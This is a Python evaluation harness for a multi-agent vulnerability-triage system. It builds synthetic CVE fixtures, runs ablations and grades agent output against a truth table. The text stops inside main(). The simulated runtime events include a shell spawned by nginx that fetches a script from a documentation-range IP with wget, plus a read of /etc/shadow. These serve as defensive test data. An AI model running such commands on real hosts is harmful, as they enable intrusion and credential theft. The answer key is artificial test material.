"""Stage 9B：四智能体有效性专项审计实验 Harness。

设计（对应 IOT_STAGE9_AGENT_EFFECTIVENESS_AUDIT.md 第二~四部分）：
- 受控 Fixture（每次运行独立临时 SQLite，绝不触碰真实库与真实设备）；
- 真实 DeepSeek LLM 调用（与生产同模型/温度；不 mock 结论本身）；
- 消融矩阵：A=纯规则(匹配+风险引擎) / B=规则+四智能体(无运行时证据) /
  C=规则+四智能体+运行时证据 / D=逐个屏蔽单个智能体的工作成果；
- 反事实：CF1 静态候选、CF2 加证据、CF3 移除证据、CF4 矛盾公告、
  CF5 监控过期/丢失未知、CF6 Zephyr 无 eBPF（System A 能力边界）、
  CF7 误匹配候选（NVD 适用分支与装机版本不符）；
- 指标：风险判断正确性（对照 Fixture 真值）、证据引用准确性、
  无依据断言（智能体状态与证据包事实的确定性矛盾检查）、
  不确定性处理（人工复核路由）、单智能体增量、运行时证据效应、
  耗时与真实 Token 用量（客户端计量，不编造）。

用法：
    python scripts/stage9_agent_effectiveness_audit.py --out reports/stage9-agent-audit
    python scripts/stage9_agent_effectiveness_audit.py --dry   # 只建 Fixture 不调 LLM

所有原始输出仅写入 --out 目录（默认在 reports/ 下，已被 .gitignore 排除）；
提交入库的只有报告中的聚合数字。
"""
from __future__ import annotations

import argparse
import json
import os
import sys
import time
import traceback
from datetime import datetime, timedelta, timezone
from pathlib import Path

BACKEND_DIR = Path(__file__).resolve().parents[1]
if str(BACKEND_DIR) not in sys.path:
    sys.path.insert(0, str(BACKEND_DIR))


# ── 计量包装：真实 Token 用量（缺失时如实记 unavailable） ─────────────────────


class UsageCounter:
    def __init__(self):
        self.calls = 0
        self.prompt_tokens = 0
        self.completion_tokens = 0
        self.total_tokens = 0
        self.known_usage_responses = 0
        self.errors: list[str] = []

    def add(self, usage):
        self.calls += 1
        if usage is None:
            return
        self.known_usage_responses += 1
        self.prompt_tokens += int(getattr(usage, "prompt_tokens", 0) or 0)
        self.completion_tokens += int(getattr(usage, "completion_tokens", 0) or 0)
        self.total_tokens += int(getattr(usage, "total_tokens", 0)
                                 or (getattr(usage, "prompt_tokens", 0) or 0)
                                 + (getattr(usage, "completion_tokens", 0) or 0))

    def as_dict(self):
        return {
            "llm_calls": self.calls,
            "prompt_tokens": self.prompt_tokens,
            "completion_tokens": self.completion_tokens,
            "total_tokens": self.total_tokens,
            "usage_reported_responses": self.known_usage_responses,
        }


class CountedReviewClient:
    """包装 autogen 模型客户端，仅计数，不改行为。"""

    def __init__(self, inner, counter: UsageCounter):
        self._inner = inner
        self._counter = counter

    async def create(self, *args, **kwargs):
        started = time.monotonic()
        try:
            response = await self._inner.create(*args, **kwargs)
        except Exception as exc:
            self._counter.errors.append(f"{type(exc).__name__}: {exc}"[:300])
            raise
        self._counter.add(getattr(response, "usage", None))
        self._counter.last_latency_ms = int((time.monotonic() - started) * 1000)
        return response

    def __getattr__(self, name):
        return getattr(self._inner, name)


class CountedChatClient:
    """包装 System A 的同步 ChatClient，仅计数。"""

    def __init__(self, inner, counter: UsageCounter):
        self._inner = inner
        self._counter = counter

    def complete(self, messages, tools=None):
        response = self._inner.complete(messages, tools=tools)
        self._counter.calls += 1
        usage = response.get("usage")
        if usage:
            self._counter.known_usage_responses += 1
            self._counter.prompt_tokens += int(usage.get("prompt_tokens") or 0)
            self._counter.completion_tokens += int(usage.get("completion_tokens") or 0)
            self._counter.total_tokens += int(usage.get("total_tokens")
                                              or (usage.get("prompt_tokens") or 0)
                                              + (usage.get("completion_tokens") or 0))
        return response


# ── Fixture 构建 ──────────────────────────────────────────────────────────────

def utc_iso(dt: datetime) -> str:
    return dt.astimezone(timezone.utc).isoformat().replace("+00:00", "Z")


def build_fixture(db, with_runtime: bool):
    """构建 5 条风险事件的受控环境。

    CVE 均为合成编号（CVE-2026-81xxx）：强制智能体只依据证据包推理，
    避免模型自身参数知识污染反事实对照。所有事实在 Fixture 真值表中定义。
    """
    from app import models
    from app.services.vulnerability_intelligence.service import upsert_source_record
    from app.services.security_evidence import persist_evidence

    now = datetime.now(timezone.utc)

    # ── 资产 ──
    edge01 = models.LinuxAsset(
        hostname="edge-01", ip_address="192.0.2.10", distribution="ubuntu",
        os_version="22.04", os_name="Ubuntu", exposure_level="public",
        business_level="core", device_type="server", inventory_complete=True,
    )
    edge02 = models.LinuxAsset(
        hostname="edge-02", ip_address="192.0.2.11", distribution="ubuntu",
        os_version="22.04", os_name="Ubuntu", exposure_level="internal",
        business_level="normal", device_type="server", inventory_complete=True,
    )
    edge03 = models.LinuxAsset(
        hostname="edge-03", ip_address="192.0.2.12", distribution="ubuntu",
        os_version="22.04", os_name="Ubuntu", exposure_level="internal",
        business_level="normal", device_type="server", inventory_complete=True,
    )
    wrt = models.LinuxAsset(
        hostname="wrt-node", ip_address="192.0.2.13", distribution="openwrt",
        os_version="23.05.3", os_name="OpenWrt", exposure_level="dmz",
        business_level="important", device_type="gateway", device_model="generic-x86-64",
        inventory_complete=True,
    )
    db.add_all([edge01, edge02, edge03, wrt])
    db.flush()

    def packages(asset, rows):
        for name, version in rows:
            db.add(models.AssetPackage(asset_id=asset.id, package_name=name,
                                       package_version=version, package_manager="apt"))

    packages(edge01, [("nginx", "1.18.0-6ubuntu14.4"), ("curl", "7.81.0-1ubuntu1.10"),
                      ("zlib1g", "1:1.2.11.dfsg-2ubuntu9")])
    packages(edge02, [("openssl", "3.0.2-0ubuntu1.10"), ("openssh-server", "1:8.9p1-3ubuntu0.4")])
    packages(edge03, [("openssl", "3.0.2-0ubuntu1.10")])
    packages(wrt, [("dropbear", "2020.81-2"), ("uhttpd", "2022-08-28-1")])
    db.flush()

    def services(asset, rows):
        for name, port, listen, public, proc in rows:
            db.add(models.AssetService(
                asset_id=asset.id, service_name=name, port=port, protocol="tcp",
                listen_address=listen, is_public_exposed=public, process_name=proc,
            ))

    services(edge01, [("nginx", 443, "0.0.0.0", True, "nginx"),
                      ("ssh", 22, "0.0.0.0", True, "sshd")])
    services(edge02, [("ssh", 22, "192.0.2.11", False, "sshd")])
    services(edge03, [("ssh", 22, "192.0.2.12", False, "sshd")])
    services(wrt, [("dropbear", 22, "192.0.2.13", True, "dropbear"),
                   ("uhttpd", 80, "192.0.2.13", True, "uhttpd")])
    db.flush()

    # ── 漏洞与多源情报（源隔离记录，经真实 upsert 函数写入） ──
    def vuln(cve, title, package, fixed, cvss, severity, desc):
        db.add(models.VulnerabilityInfo(
            cve_id=cve, title=title, description=desc, cvss_score=cvss,
            cvss_severity=severity, affected_package=package, fixed_version=fixed,
            source="fixture", published_date="2026-09-01", last_modified_date="2026-10-01",
        ))
        db.flush()

    # E1：厂商确认受影响 + KEV + 高 EPSS + 公网核心资产 + 直接运行时证据
    vuln("CVE-2026-81001:jammy", "nginx HTTP/2 request smuggling (fixture)",
         "nginx", "1.18.0-6ubuntu14.6", 9.8, "Critical",
         "Fixture synthetic advisory: request smuggling in nginx HTTP/2 handling.")
    # E2：同资产、客户端包受影响，但无任何相关运行时证据
    vuln("CVE-2026-81002:jammy", "curl SOCKS5 heap overflow (fixture)",
         "curl", "7.81.0-1ubuntu1.16", 8.1, "High",
         "Fixture synthetic advisory: heap overflow in curl SOCKS5 proxy handshake.")
    # E3：NVD-only 候选——NVD 描述写明受影响分支为 3.1.x，3.0.x LTS 不受影响
    #（确定性版本规则仍判 potentially_affected：误匹配候选，考智能体能否识破）
    vuln("CVE-2026-81003:jammy", "openssl ASN.1 buffer overread (fixture)",
         "openssl", "3.0.2-0ubuntu1.15", 7.5, "High",
         "Fixture synthetic advisory. Affected branch: 3.1.0 before 3.1.7 only. "
         "The 3.0.x LTS branch (including 3.0.2-0ubuntu1.x) is NOT affected.")
    # E4：厂商 under_investigation vs NVD affected vs KEV 的矛盾情报
    vuln("CVE-2026-81004:jammy", "openssl DoS via crafted certificate (fixture)",
         "openssl", "3.0.2-0ubuntu1.15", 9.8, "Critical",
         "Fixture synthetic advisory: DoS via crafted X.509 certificate chain.")
    # E5：OpenWrt 设备 dropbear（厂商公告精确版本语义）
    db.add(models.VulnerabilityInfo(
        cve_id="CVE-2026-81005", title="dropbear pre-auth overflow (fixture)",
        description="Fixture synthetic advisory: pre-auth overflow in dropbear.",
        cvss_score=8.8, cvss_severity="High", affected_package="dropbear",
        fixed_version="2022.86-1", source="openwrt_operator_advisory",
        published_date="2026-09-10", last_modified_date="2026-10-01",
    ))
    db.flush()

    def intel(cve_base, kev, epss, pct):
        db.add(models.ThreatIntelSource(
            cve_id=cve_base + ":jammy" if cve_base != "CVE-2026-81005" else cve_base,
            is_kev=kev, epss_score=epss, epss_percentile=pct,
            exploit_status="known-exploited" if kev else "none",
        ))

    intel("CVE-2026-81001", True, 0.88, 0.97)
    intel("CVE-2026-81002", False, 0.05, 0.31)
    intel("CVE-2026-81003", False, 0.30, 0.72)
    intel("CVE-2026-81004", True, 0.75, 0.94)
    intel("CVE-2026-81005", False, 0.12, 0.44)
    db.flush()

    def sources(cve_base, canonical, nvd, kev, epss):
        if canonical is not None:
            upsert_source_record(db, cve_base, "canonical", {"records": [canonical]},
                                 source_updated_at="2026-10-01T00:00:00Z")
        upsert_source_record(db, cve_base, "nvd", nvd, source_updated_at="2026-10-01T00:00:00Z")
        if kev is not None:
            upsert_source_record(db, cve_base, "cisa_kev", kev, source_updated_at="2026-10-02T00:00:00Z")
        if epss is not None:
            upsert_source_record(db, cve_base, "epss", epss, source_updated_at="2026-10-02T00:00:00Z")

    sources("CVE-2026-81001",
            {"release": "jammy", "package": "nginx", "status": "affected",
             "fixed_version": "1.18.0-6ubuntu14.6", "priority": "high"},
            {"cvss": {"score": 9.8, "severity": "Critical", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
             "description": "Request smuggling in nginx HTTP/2 handling (fixture).", "cwe": ["CWE-444"]},
            {"is_kev": True, "date_added": "2026-09-30", "due_date": "2026-10-21"},
            {"score": 0.88, "percentile": 0.97})
    sources("CVE-2026-81002",
            {"release": "jammy", "package": "curl", "status": "affected",
             "fixed_version": "7.81.0-1ubuntu1.16", "priority": "medium"},
            {"cvss": {"score": 8.1, "severity": "High", "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"},
             "description": "Heap overflow in curl SOCKS5 proxy handshake (fixture).", "cwe": ["CWE-787"]},
            None, {"score": 0.05, "percentile": 0.31})
    sources("CVE-2026-81003",
            None,
            {"cvss": {"score": 7.5, "severity": "High", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"},
             "description": "ASN.1 buffer overread (fixture). Affected branch: 3.1.0 before 3.1.7 only. "
                            "The 3.0.x LTS branch (including 3.0.2-0ubuntu1.x) is NOT affected.",
             "cwe": ["CWE-125"], "cpe_status": "affected"},
            None, {"score": 0.30, "percentile": 0.72})
    sources("CVE-2026-81004",
            {"release": "jammy", "package": "openssl", "status": "under_investigation",
             "fixed_version": "3.0.2-0ubuntu1.15", "priority": "unknown"},
            {"cvss": {"score": 9.8, "severity": "Critical", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
             "description": "DoS via crafted X.509 certificate chain (fixture).", "cwe": ["CWE-400"],
             "cpe_status": "affected"},
            {"is_kev": True, "date_added": "2026-10-05", "due_date": "2026-10-26"},
            {"score": 0.75, "percentile": 0.94})
    db.flush()

    # OpenWrt 厂商公告（人工登记语义）
    db.add(models.OpenWrtAdvisory(
        cve_id="CVE-2026-81005", package_name="dropbear", release="23.05.3",
        source_url="https://fixtures.invalid/openwrt-advisory-81005",
        affected_versions_json=json.dumps(["2020.81-2"]),
        fixed_versions_json=json.dumps(["2022.86-1"]),
    ))
    db.flush()

    # ── 运行时证据（RuntimeEvent + SecurityEvidence 双表，经真实摄取语义） ──
    if with_runtime:
        recent = utc_iso(now - timedelta(minutes=40))
        stale_ts = utc_iso(now - timedelta(hours=72))

        def ev(host, asset, category, event_type, process, parent, cmdline, *, dest="", port=0,
               file_path="", sev="info", score=0, ts=None, pid=0, ppid=0, rule=""):
            return {
                "hostname": host, "asset_id": asset.id, "source": "falco", "event_type": event_type,
                "category": category, "severity": sev, "severity_score": score, "rule": rule,
                "process_name": process, "parent_process": parent, "commandline": cmdline,
                "file_path": file_path, "destination": dest, "port": port,
                "tactic": "", "technique": "", "risk_signal": rule,
                "timestamp": ts or recent, "occurred_at": ts or recent,
                "process_id": pid, "parent_process_id": ppid,
                "process_exec_id": f"exec-{host}-{pid}-{abs(hash(cmdline)) % 99999}",
                "parent_exec_id": f"exec-{host}-{ppid}" if ppid else "",
                "raw": {"fixture": True},
            }

        events = [
            # edge-01：nginx → sh → wget 可疑链 + 敏感文件读取（E1 相关）
            ev("edge-01", edge01, "process_execution", "execve", "nginx", "systemd",
               "nginx: worker process", pid=1200, ppid=1100),
            ev("edge-01", edge01, "process_execution", "execve", "sh", "nginx",
               "sh -c wget -qO /tmp/x http://198.51.100.23/x.sh", pid=1301, ppid=1200, sev="warning", score=62,
               rule="service_shell_spawn"),
            ev("edge-01", edge01, "process_execution", "execve", "wget", "sh",
               "wget -qO /tmp/x http://198.51.100.23/x.sh", pid=1302, ppid=1301, sev="warning", score=58,
               rule="downloader_execution"),
            ev("edge-01", edge01, "network_activity", "connect", "wget", "sh",
               "wget -qO /tmp/x http://198.51.100.23/x.sh", dest="198.51.100.23:4444", port=4444,
               pid=1302, ppid=1301, sev="warning", score=60),
            ev("edge-01", edge01, "sensitive_file_access", "openat", "sh", "nginx",
               "sh -c cat /etc/shadow", file_path="/etc/shadow", sev="critical", score=88,
               rule="read_sensitive_file", pid=1301, ppid=1200),
            ev("edge-01", edge01, "network_activity", "connect", "nginx", "systemd",
               "nginx: worker process", dest="192.0.2.50:443", port=443, pid=1200, ppid=1100),
        ]
        # edge-02：良性背景事件（E3/E4 无 openssl 直接证据）
        events += [
            ev("edge-02", edge02, "process_execution", "execve", "apt", "systemd",
               "apt update", pid=2100, ppid=2000),
            ev("edge-02", edge02, "network_activity", "connect", "apt", "systemd", "apt update",
               dest="198.51.100.30:80", port=80, pid=2100, ppid=2000),
            ev("edge-02", edge02, "process_execution", "execve", "sshd", "systemd",
               "sshd: session", pid=2200, ppid=2000),
            ev("edge-02", edge02, "sensitive_file_access", "openat", "sshd", "systemd",
               "sshd: session", file_path="/etc/passwd", sev="notice", score=36,
               rule="account_maintenance"),
        ]
        # wrt-node：72 小时前的过期证据（E5 数据质量反事实）
        events += [
            ev("wrt-node", wrt, "process_execution", "execve", "dropbear", "procd",
               "dropbear -p 22", pid=3100, ppid=3000, ts=stale_ts),
            ev("wrt-node", wrt, "network_activity", "connect", "dropbear", "procd",
               "dropbear -p 22", dest="192.0.2.60:52111", port=52111, pid=3100, ppid=3000, ts=stale_ts),
        ]
        for item in events:
            db.add(models.RuntimeEvent(
                asset_id=item["asset_id"], hostname=item["hostname"], source=item["source"],
                event_type=item["event_type"], category=item["category"], severity=item["severity"],
                severity_score=item["severity_score"], rule=item["rule"],
                process_name=item["process_name"], parent_process=item["parent_process"],
                commandline=item["commandline"], file_path=item["file_path"],
                destination=item["destination"], port=item["port"], risk_signal=item["risk_signal"],
                raw_json=json.dumps(item["raw"]), occurred_at=item["occurred_at"],
                process_id=item["process_id"], parent_process_id=item["parent_process_id"],
                process_exec_id=item["process_exec_id"], parent_exec_id=item["parent_exec_id"],
                sensor_id="sensor-" + item["hostname"], event_fingerprint=f"fp-{abs(hash(str(item)))%10**18}",
            ))
        db.flush()
        persist_evidence(db, events)

        # 采集器心跳：edge-01 正常；wrt-node 过期 + 丢失计数未上报（unavailable）
        db.add(models.RuntimeSensor(
            asset_id=edge01.id, sensor_id="sensor-edge-01", source="falco", status="running",
            last_heartbeat_at=now, dropped_events=0,
            capabilities_json=json.dumps({"metrics": "dropped_events"}), detail="fixture",
        ))
        db.add(models.RuntimeSensor(
            asset_id=wrt.id, sensor_id="sensor-wrt-node", source="logread", status="running",
            last_heartbeat_at=now - timedelta(hours=72), dropped_events=None,
            capabilities_json=json.dumps({"metrics": "unavailable"}), detail="fixture",
        ))
        db.flush()

    # ── 匹配与规则基线（消融组 A 的输出） ──
    from app.services.matching_engine import run_matching
    from app.services.risk_engine import calculate_risk

    run_matching(db)
    calculate_risk(db)
    db.commit()


# ── Fixture 真值表（评测标准的唯一来源，与实现解耦） ────────────────────────────

TRUTH = {
    "CVE-2026-81001": {
        "label": "E1 公网核心资产·厂商确认受影响·KEV·直接运行时证据",
        "impact": "confirmed_affected",
        "directions": {"upgrade_minor", "upgrade_major"},
        "actions": {"immediate_fix", "scheduled_fix"},
        "needs_human": True,            # High/Critical 或 immediate_fix → 审计策略必须转人工
        "runtime_expect": "verified",
    },
    "CVE-2026-81002": {
        "label": "E2 同资产客户端包受影响·无相关运行时证据",
        "impact": "confirmed_affected",
        "directions": {"maintain", "downgrade_minor"},
        "actions": {"scheduled_fix", "monitor"},
        "needs_human": None,            # 自动确认或人工复核皆可接受（低紧迫度）
        "runtime_expect": "not_observed",
    },
    "CVE-2026-81003": {
        "label": "E3 NVD-only 误匹配候选·NVD 明示 3.1.x 才受影响而装机为 3.0.x",
        "impact": {"not_affected", "insufficient_evidence"},
        "directions": {"maintain", "downgrade_minor", "downgrade_major"},
        "actions": {"monitor", "defer", "collect_more_evidence"},
        "needs_human": None,
        "runtime_expect": None,
    },
    "CVE-2026-81004": {
        "label": "E4 厂商 under_investigation vs NVD affected vs KEV 矛盾情报",
        "impact": {"insufficient_evidence", "confirmed_affected", "potentially_affected"},
        "directions": {"maintain", "upgrade_minor", "upgrade_major"},
        "actions": {"monitor", "collect_more_evidence", "mitigate"},
        "needs_human": True,            # 冲突/证据不充分必须人工
        "runtime_expect": None,
    },
    "CVE-2026-81005": {
        "label": "E5 OpenWrt dropbear 受影响·采集过期+丢失未知",
        "impact": {"confirmed_affected", "potentially_affected"},
        "directions": {"maintain", "upgrade_minor"},
        "actions": {"scheduled_fix", "monitor", "collect_more_evidence", "mitigate"},
        "needs_human": None,
        "runtime_expect": None,
    },
}

CASE_ORDER = ["CVE-2026-81001", "CVE-2026-81002", "CVE-2026-81003", "CVE-2026-81004", "CVE-2026-81005"]


# ── 规则基线（消融组 A） ──────────────────────────────────────────────────────

def collect_baseline(db):
    from app import models
    rows = {}
    for risk in db.query(models.RiskAssessment).all():
        rows[risk.cve_id.split(":")[0]] = {
            "risk_id": risk.id,
            "preliminary_score": risk.preliminary_score,
            "preliminary_level": risk.preliminary_level,
            "preliminary_decision": risk.preliminary_decision,
            "runtime_status": risk.runtime_status,
            "reachable_status": risk.reachable_status,
            "exploitability_status": risk.exploitability_status,
            "affected_status": risk.affected_status,
        }
    return rows


# ── 智能体评审运行（消融组 B/C/D 与反事实 CF1-CF5/CF7） ─────────────────────────

def run_review(db, run_id: str, mask_agent: str = "", counter: UsageCounter | None = None,
               selected_risks=None):
    import app.services.event_review_pipeline as erp
    from app import models

    if selected_risks is not None:
        selected = list(selected_risks)
    else:
        selected = [r for r in db.query(models.RiskAssessment).all()
                    if r.review_status in erp.REVIEWABLE_STATUSES]
    counter = counter or UsageCounter()

    real_client_factory = erp._create_model_client
    real_run_typed = erp._run_typed_agent

    def counted_factory():
        return CountedReviewClient(real_client_factory(), counter)

    async def masking_run_typed(agent_name, prompt, context, packet, model_client):
        if agent_name == mask_agent:
            return None, {
                "agent_name": agent_name, "status": "failed", "parse_status": "masked_by_experiment",
                "attempts": 0, "retry_count": 0, "duration_ms": 0, "output_valid": False,
                "output": None, "raw_text": "", "error": "masked_by_experiment",
            }
        return await real_run_typed(agent_name, prompt, context, packet, model_client)

    erp._create_model_client = counted_factory
    if mask_agent:
        erp._run_typed_agent = masking_run_typed
    started = time.monotonic()
    try:
        result = erp.run_review_analysis(db, run_id=run_id, selected_risks=selected)
    finally:
        erp._create_model_client = real_client_factory
        if mask_agent:
            erp._run_typed_agent = real_run_typed
    wall_s = round(time.monotonic() - started, 1)

    per_event = []
    for risk in db.query(models.RiskAssessment).all():
        base = risk.cve_id.split(":")[0]
        entry = {
            "case": base,
            "review_status": risk.review_status,
            "human_review_required": bool(risk.human_review_required),
            "policy_reasons": json.loads(risk.audit_policy_reasons or "[]"),
            "final_score": risk.final_score,
            "risk_level": risk.risk_level,
            "decision": risk.decision,
            "review_confidence": risk.review_confidence,
            "recommended_priority": risk.recommended_priority,
            "recommended_action": risk.recommended_action,
            "risk_direction": risk.risk_direction,
            "review_missing_evidence": json.loads(risk.review_missing_evidence or "[]"),
            "review_conflicts": json.loads(risk.review_conflicts or "[]"),
            "review_failed_agents": json.loads(risk.review_failed_agents or "[]"),
            "agent_results": json.loads(risk.agent_results_json or "{}"),
            "conflict": json.loads(risk.conflict_result_json or "{}"),
        }
        per_event.append(entry)

    audit_records = db.query(models.AgentAuditRecord).filter_by(run_id=run_id).count()
    return {
        "run_id": run_id, "status": result.get("status"),
        "termination_reason": result.get("termination_reason"),
        "wall_seconds": wall_s,
        "usage": counter.as_dict(),
        "agent_audit_records": audit_records,
        "agent_executions": result.get("agent_executions", {}),
        "events": sorted(per_event, key=lambda item: CASE_ORDER.index(item["case"])
                         if item["case"] in CASE_ORDER else 99),
        "raw_answer": result.get("answer", ""),
    }


# ── 无依据断言检查（智能体结构化状态 vs 证据包确定性事实） ────────────────────────

def unsupported_assertions(event: dict) -> list[str]:
    """确定性矛盾检查：不评文风，只抓与证据包事实直接冲突的结构化结论。"""
    problems: list[str] = []
    packet = event.get("evidence_packet") or {}
    runtime_direct = (packet.get("runtime_evidence") or [])
    has_direct_runtime = any(
        item.get("evidence_type") == "runtime_event" for item in runtime_direct
    )
    services = (packet.get("service_context") or {}).get("services", [])
    public_listener = any(s.get("public") for s in services)

    runtime_result = event.get("exposure_runtime") or {}
    if runtime_result.get("runtime_status") == "verified" and not has_direct_runtime:
        problems.append("runtime_status=verified 但证据包无任何 runtime_event 条目")
    if runtime_result.get("exposure_status") == "internet_reachable" and not public_listener:
        problems.append("exposure_status=internet_reachable 但资产无公网监听服务")
    if runtime_result.get("exposure_status") == "unreachable" and public_listener:
        problems.append("exposure_status=unreachable 但资产存在公网监听服务")

    impact = event.get("impact_assessment") or {}
    if impact.get("impact_status") == "confirmed_affected":
        match = packet.get("package_match") or {}
        intel = packet.get("threat_intelligence") or {}
        if match.get("match_status") in {"not_affected", "fixed"}:
            problems.append("impact=confirmed_affected 但确定性匹配为不受影响")
        if not match.get("installed_version"):
            problems.append("impact=confirmed_affected 但缺装机版本")

    evidence_audit = event.get("evidence_audit") or {}
    cited = set(evidence_audit.get("valid_evidence_ids") or [])
    packet_ids = {item.get("evidence_id") for item in (packet.get("evidence_items") or [])}
    problems += [f"evidence_audit 引用包外证据 {eid}" for eid in sorted(cited - packet_ids)]
    return problems


# ── 评分（对照真值表） ────────────────────────────────────────────────────────

def grade_run(run: dict) -> dict:
    graded = []
    for event in run["events"]:
        case = event["case"]
        truth = TRUTH.get(case)
        if not truth or event["review_status"] in {"candidate", "pending"}:
            graded.append({"case": case, "graded": False, "label": (truth or {}).get("label", "")})
            continue
        coordinator_ok = event["review_status"] != "skipped" and event.get("recommended_action")
        agent_results = event.get("agent_results") or {}
        # _persist_event_result 直接存 model_dump（无 output 包裹键）
        impact = agent_results.get("impact_assessment_agent") or {}
        runtime = agent_results.get("exposure_runtime_agent") or {}
        evidence = agent_results.get("evidence_audit_agent") or {}
        packet_event = next((
            item for item in (run.get("event_packets") or []) if item.get("case") == case), {})
        problems = unsupported_assertions({**(packet_event or {}), **{
            "exposure_runtime": runtime, "impact_assessment": impact, "evidence_audit": evidence}})
        impact_ok = (impact.get("impact_status") in truth["impact"]) if impact.get("impact_status") else None
        direction_ok = (event.get("risk_direction") in truth["directions"]) if coordinator_ok else None
        action_ok = (event.get("recommended_action") in truth["actions"]) if coordinator_ok else None
        routing_expected = truth["needs_human"]
        routing_ok = None
        if routing_expected is not None:
            routing_ok = bool(event["human_review_required"]) == bool(routing_expected)
        cited = set(evidence.get("valid_evidence_ids") or [])
        graded.append({
            "case": case, "graded": True, "label": truth["label"],
            "impact_status": impact.get("impact_status"), "impact_ok": impact_ok,
            "risk_direction": event.get("risk_direction"), "direction_ok": direction_ok,
            "recommended_action": event.get("recommended_action"), "action_ok": action_ok,
            "human_review_required": event["human_review_required"], "routing_ok": routing_ok,
            "policy_reasons": event["policy_reasons"],
            "evidence_quality": evidence.get("evidence_quality"),
            "runtime_status_agent": runtime.get("runtime_status"),
            "unsupported_assertions": problems,
            "cited_evidence_count": len(cited),
            "confidence": event.get("review_confidence"),
        })
    return {"run_id": run.get("run_id"), "events": graded}


def summarize_scores(graded: dict) -> dict:
    rows = [row for row in graded["events"] if row.get("graded")]
    if not rows:
        return {"graded_events": 0}
    def rate(field):
        values = [row.get(field) for row in rows if row.get(field) is not None]
        return {"n": len(values), "pass": sum(1 for v in values if v is True)} if values else {"n": 0, "pass": 0}
    unsupported = sum(len(row.get("unsupported_assertions") or []) for row in rows)
    return {
        "graded_events": len(rows),
        "impact_correct": rate("impact_ok"),
        "direction_appropriate": rate("direction_ok"),
        "action_appropriate": rate("action_ok"),
        "human_review_routing": rate("routing_ok"),
        "unsupported_assertion_count": unsupported,
        "avg_confidence": round(sum(row.get("confidence") or 0 for row in rows) / len(rows), 3),
    }


# ── System A（工具循环四智能体编排） ────────────────────────────────────────────

def run_system_a(db, target_ref: str, target_type: str, counter: UsageCounter,
                 mask_runtime: bool = False):
    from app import models
    from app.services import trace_service as tracing
    from app.services.agents import orchestrator
    from app.services.agents import base as agent_base

    real_client_factory = orchestrator.default_client_factory
    real_run = agent_base.ToolLoopAgent.run

    def counted_factory():
        return CountedChatClient(real_client_factory(), counter)

    if mask_runtime:
        def masked_run(self, db_session, context, deadline_s=150.0):
            if self.spec.name == "runtime_behavior_agent":
                return agent_base.AgentResult(
                    self.spec.name, "succeeded",
                    {"behavior_level": "NORMAL", "evidence_ids": [], "findings": [],
                     "scope": "masked_by_experiment", "confidence": 0.1,
                     "data_gaps": ["masked_by_experiment"]},
                    attempts=1, latency_ms=1)
            return real_run(self, db_session, context, deadline_s)
        agent_base.ToolLoopAgent.run = masked_run

    # 与 start_analysis 相同的建行/追踪语义，但同步执行（便于计量）
    trace = tracing.start_trace(db, task_type="four_agent_analysis", target_type=target_type,
                                target_ref=target_ref, run_ref_type="agent_orchestration",
                                run_ref_id="pending", metadata={})
    marks = orchestrator._target_capability_marks(db, target_type, target_ref)
    run = models.AgentOrchestrationRun(
        run_id=orchestrator.new_run_id(), target_type=target_type, target_ref=target_ref,
        status="running", trace_id=trace.trace_id,
        stages_json=json.dumps({stage: {"status": "pending"} for stage in orchestrator.STAGES}),
    )
    db.add(run)
    db.commit()
    trace.run_ref_id = run.run_id
    db.commit()
    if marks:
        tracing.emit(db, trace.trace_id, "capability_marks", actor="pipeline",
                     status="unsupported", payload={"target": target_ref, "capabilities": marks})
    started = time.monotonic()
    try:
        orchestrator.run_orchestration(db, run, client_factory=counted_factory)
    finally:
        agent_base.ToolLoopAgent.run = real_run
    wall_s = round(time.monotonic() - started, 1)

    trace_events = [row.event_type for row in db.query(models.TraceEvent)
                    .filter_by(trace_id=trace.trace_id).all()]
    capability_payload = None
    if marks:
        row = (db.query(models.TraceEvent)
               .filter(models.TraceEvent.trace_id == trace.trace_id,
                       models.TraceEvent.event_type == "capability_marks").first())
        capability_payload = json.loads(row.payload_json or "{}") if row else None
    return {
        "run_id": run.run_id, "trace_id": trace.trace_id, "status": run.status,
        "error": run.error, "target": target_ref, "masked_runtime": mask_runtime,
        "capability_marks": capability_payload,
        "stages": json.loads(run.stages_json or "{}"),
        "agents": json.loads(run.agents_json or "{}"),
        "risk": json.loads(run.risk_json or "{}"),
        "remediation": json.loads(run.remediation_json or "{}"),
        "trace_event_types": trace_events,
        "wall_seconds": wall_s,
        "usage": counter.as_dict(),
    }


# ── 主流程 ────────────────────────────────────────────────────────────────────

def fresh_session_factory(tmp_root: Path):
    from sqlalchemy import create_engine
    from sqlalchemy.orm import sessionmaker
    from app import models  # noqa: F401  先注册全部模型再建表
    from app.database import Base

    tmp_root.mkdir(parents=True, exist_ok=True)
    db_path = tmp_root / "linuxguard.db"
    engine = create_engine(f"sqlite:///{db_path}", connect_args={"check_same_thread": False})
    Base.metadata.create_all(bind=engine)
    factory = sessionmaker(bind=engine, autoflush=False, autocommit=False)
    return factory, engine


def main():
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--out", default="reports/stage9-agent-audit")
    parser.add_argument("--dry", action="store_true", help="只构建 Fixture 并计算规则基线，不调用 LLM")
    parser.add_argument("--runs", default="A,B,C,D1,D2,D3,D4,sysA,sysA-mask,sysA-zephyr",
                        help="逗号分隔的运行列表")
    args = parser.parse_args()

    out_dir = Path(args.out)
    out_dir.mkdir(parents=True, exist_ok=True)
    runs = [item.strip() for item in args.runs.split(",") if item.strip()]

    # 隔离环境变量（必须在 import app 前设置；保留 .env 中的 DEEPSEEK 配置）
    work_root = out_dir / "work"
    work_root.mkdir(parents=True, exist_ok=True)
    os.environ["LINUXGUARD_DATA_DIR"] = str(work_root / "data")
    os.environ["LINUXGUARD_ARCHIVE_ON_STARTUP"] = "0"
    os.environ["LINUXGUARD_DEPLOYMENT_MODE"] = "standard"

    from app import config as app_config

    results: dict = {"generated_at": utc_iso(datetime.now()), "model": app_config.DEEPSEEK_MODEL,
                     "base_url_configured": bool(app_config.DEEPSEEK_API_KEY)}

    def build(case_name: str, with_runtime: bool):
        """独立 Fixture 会话；返回 (session_factory, engine)。"""
        return fresh_session_factory(work_root / case_name)

    def close(engine):
        from app.database import Base
        Base.metadata.drop_all(bind=engine)
        engine.dispose()

